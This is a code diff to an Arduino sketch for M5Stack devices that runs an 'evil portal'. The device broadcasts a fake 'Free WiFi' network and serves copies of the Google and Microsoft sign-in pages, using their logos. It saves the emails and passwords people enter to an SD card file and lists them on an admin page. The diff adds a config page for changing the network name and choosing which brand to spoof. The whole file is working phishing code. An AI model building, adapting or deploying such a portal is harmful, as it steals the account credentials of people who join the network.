@@ -1,13 +1,26 @@
+// Author: Helvio Junior (M4v3r1ck)
+//         https://github.com/helviojunior/m5stack-captive-portal
+//
 // Based on https://github.com/n0xa/M5Stick-Stuph/blob/main/CaptPort/CaptPort.ino
 //      and https://github.com/marivaaldo/evil-portal-m5stack
+//
 
 #include <WiFi.h>
 #include <DNSServer.h>
 #include <WebServer.h>
 
+// Define your hardware
 //#define M5STICK_C_PLUS
 #define M5STICK_C_PLUS_2
 //#define M5CARDPUTER
+
+// Define the language
+// #define LANGUAGE_EN_US
+#define LANGUAGE_PT_BR
+
+// Standard Wifi Name
+// Can be changed at http://127.0.0.1/ssid
+#define DEFAULT_AP_SSID_NAME "Free WiFi"
 
 #if defined(M5STICK_C_PLUS) && defined(M5STICK_C_PLUS_2) && defined(M5CARDPUTER)
 #error "Please define only one platform: M5STICK_C_PLUS, M5STICK_C_PLUS_2 or M5CARDPUTER"
@@ -77,10 +90,8 @@ LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
 #include <SPI.h>
 #endif
 
-#define DEFAULT_AP_SSID_NAME "Free WiFi"
-#define SD_CREDS_PATH "/evil-portal-creds.txt"
-// #define LANGUAGE_EN_US
-#define LANGUAGE_PT_BR
+
+#define SD_CREDS_PATH "/creds.txt"
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
 #error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
@@ -119,6 +130,9 @@ int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
 String capturedCredentialsHtml = "";
 bool sdcardMounted = false;
 String hr,mi,se;
+
+byte use_google = 1;
+byte use_microsoft = 1;
 
 int cp1,cp2;
 String last_auth_prov[4]={"", "", "", ""};
@@ -268,9 +282,23 @@ void setupWebServer() {
     webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
   });
 
+  webServer.on("/config", []() {
+    webServer.send(HTTP_CODE, "text/html", config_GET());
+  });
+
+  webServer.on("/post_config", []() {
+    webServer.send(HTTP_CODE, "text/html", config_POST());
+  });
+
   webServer.onNotFound([]() {
     lastActivity = millis();
-    webServer.send(HTTP_CODE, "text/html", index_GET());
+    if ((use_google == 1) && (use_microsoft == 1)){
+      webServer.send(HTTP_CODE, "text/html", index_GET());
+    }else if (use_microsoft == 1){
+      webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
+    }else{
+      webServer.send(HTTP_CODE, "text/html", provider_GET("google"));
+    }
   });
 
   webServer.begin();
@@ -416,8 +444,16 @@ void printScreen() {
   spr.drawString("MSFT",14,82,2);
   spr.drawString("GOOGLE",74,82,2);
   spr.setFreeFont(&DSEG7_Classic_Bold_17);
-  spr.drawString(String(cp1),17,102);
-  spr.drawString(String(cp2),77,102);
+  if (use_microsoft) {
+    spr.drawString(String(cp1),17,102);
+  }else{
+    spr.drawString("na",17,102);
+  }
+  if (use_google) {
+    spr.drawString(String(cp2),77,102);
+  }else{
+    spr.drawString("na",77,102);
+  }
 
   spr.setTextDatum(0);
   spr.pushSprite(0,0); 
@@ -462,18 +498,18 @@ void drawBatteryBar(){
 
   int battery = 0;
   #if defined(PWRMGMT)
-    battery = M5.Power.getBatteryLevel();
+    battery = round(M5.Power.getBatteryLevel());
   #endif
 
   #ifdef defined(AXP)
     float b = M5.Axp.GetVbatData() * 1.1 / 1000;
-    battery = ((b - 3.0) / 1.2) * 100;
+    battery = round(((b - 3.0) / 1.2) * 100);
   #endif
 
   uint16_t batteryBarColor = BLUE;
-  if(battery < 40) {
+  if(battery <= 40) {
     batteryBarColor = ConvertRGB(170,0,0);
-  } else if(battery < 60) {
+  } else if(battery <= 60) {
     batteryBarColor = ConvertRGB(238,138,17);
   } else {
     batteryBarColor = ConvertRGB(0,135,67);
@@ -495,52 +531,6 @@ String getInputValue(String argName) {
   a.replace(">", "&gt;");
   a.substring(0, 200);
   return a;
-}
-
-String getHtmlContents(String body, String provider) {
-
-  if (provider.isEmpty()) provider = "Google";
-
-  provider.toLowerCase();
-  String logo = "";
-  if ((provider == "microsoft") || (provider == "msft")){
-    provider = "msft";
-    logo = "<svg viewBox='0 0 108 24' width='108' height='24' xmlns='http://www.w3.org/2000/svg'><path d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z' fill='#737373'/><rect width='10.931' height='10.931' fill='#f25022'/><rect x='12.069' width='10.931' height='10.931' fill='#7fba00'/><rect y='12.069' width='10.931' height='10.931' fill='#00a4ef'/><rect x='12.069' y='12.069' width='10.931' height='10.931' fill='#ffb900'/></svg>";
-  }else{
-    logo = "<svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg>";
-  }
-
-  String html =
-    "<!DOCTYPE html>"
-    "<html>"
-    "<head>"
-    "  <title>"
-    + apSsidName + "</title>"
-                   "  <meta charset='UTF-8'>"
-                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
-                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
-                   "</head>"
-                   "<body>"
-                   "  <div class='container'>"
-                   "    <div class='logo-container'>"
-                   "      <?xml version='1.0' standalone='no'?>"
-                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
-                   "    </div>"
-                   "    <div class=form-container>"
-                   "      <center>"
-                   "        <div class='containerlogo'>"+ logo + "</div>"
-                   "      </center>"
-                   "      <div style='min-height: 150px'>"
-    + body + "      </div>"
-             "    </div>"
-             "  </div>"
-             "</body>"
-             "</html>";
-  return html;
-}
-
-String creds_GET() {
-  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>", "");
 }
 
 
@@ -658,22 +648,6 @@ String index_POST() {
   return getHtmlContents("<center><div class='containermsg'>" + msg + "</div></center>", provider);
 }
 
-String clear_GET() {
-  String email = "<p></p>";
-  String password = "<p></p>";
-  capturedCredentialsHtml = "<p></p>";
-  totalCapturedCredentials = cp1 = cp2 = 0;
-
-  for(int i=0;i<4;i++){
-    last_auth_prov[i] = "";
-    last_auth_idx[i] = 0;
-    last_auth_pass[i] = "";
-    last_auth_pass[i] = "";
-  }
-
-  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>", "");
-}
-
 #if defined(HAS_LED)
 
 void blinkLed() {
@@ -717,3 +691,123 @@ void appendToFile(fs::FS& fs, const char* path, const char* text) {
 }
 
 #endif
+
+
+
+String getHtmlContents(String body, String provider) {
+
+  if (provider.isEmpty()) provider = "Google";
+
+  provider.toLowerCase();
+  String logo = "";
+  if ((provider == "microsoft") || (provider == "msft")){
+    provider = "msft";
+    logo = "<svg viewBox='0 0 108 24' width='108' height='24' xmlns='http://www.w3.org/2000/svg'><path d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z' fill='#737373'/><rect width='10.931' height='10.931' fill='#f25022'/><rect x='12.069' width='10.931' height='10.931' fill='#7fba00'/><rect y='12.069' width='10.931' height='10.931' fill='#00a4ef'/><rect x='12.069' y='12.069' width='10.931' height='10.931' fill='#ffb900'/></svg>";
+  }else{
+    logo = "<svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg>";
+  }
+
+  String html =
+    "<!DOCTYPE html>"
+    "<html>"
+    "<head>"
+    "  <title>"
+    + apSsidName + "</title>"
+                   "  <meta charset='UTF-8'>"
+                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
+                   "</head>"
+                   "<body>"
+                   "  <div class='container'>"
+                   "    <div class='logo-container'>"
+                   "      <?xml version='1.0' standalone='no'?>"
+                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
+                   "    </div>"
+                   "    <div class=form-container>"
+                   "      <center>"
+                   "        <div class='containerlogo'>"+ logo + "</div>"
+                   "      </center>"
+                   "      <div style='min-height: 150px'>"
+    + body + "      </div>"
+             "    </div>"
+             "  </div>"
+             "</body>"
+             "</html>";
+  return html;
+}
+
+
+String clear_GET() {
+  String email = "<p></p>";
+  String password = "<p></p>";
+  capturedCredentialsHtml = "<p></p>";
+  totalCapturedCredentials = cp1 = cp2 = 0;
+
+  for(int i=0;i<4;i++){
+    last_auth_prov[i] = "";
+    last_auth_idx[i] = 0;
+    last_auth_pass[i] = "";
+    last_auth_pass[i] = "";
+  }
+
+  return getAdminHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
+}
+
+String creds_GET() {
+  return getAdminHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
+}
+
+
+String config_GET() {
+  
+  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<input name='google' class='input-field' type='checkbox' value='on' checked />Google<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
+}
+
+String config_POST() {
+  String ssid = getInputValue("ssid");
+  String msft = getInputValue("msft");
+  String google = getInputValue("google");
+
+  String oldSSid = apSsidName;
+  if (!ssid.isEmpty()) apSsidName = ssid;
+  
+  use_microsoft = 0;
+  use_google = 0;
+  if (!msft.isEmpty() && msft == "on") use_microsoft = 1;
+  if (!google.isEmpty() && google == "on") use_google = 1;
+
+  if ((use_microsoft == 0) && (use_google == 0)) use_google = 1;
+
+  if (oldSSid != apSsidName) setupWiFi();
+
+  lastActivity = millis() + 1000;
+  return getAdminHtmlContents("<center><div class='containermsg'>Config OK</div></center>");
+}
+
+String getAdminHtmlContents(String body) {
+
+  String html =
+    "<!DOCTYPE html>"
+    "<html>"
+    "<head>"
+    "  <title>"
+    + apSsidName + "</title>"
+                   "  <meta charset='UTF-8'>"
+                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} input[type='checkbox']{ width: 20px; margin-left: 10px; } .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
+                   "</head>"
+                   "<body>"
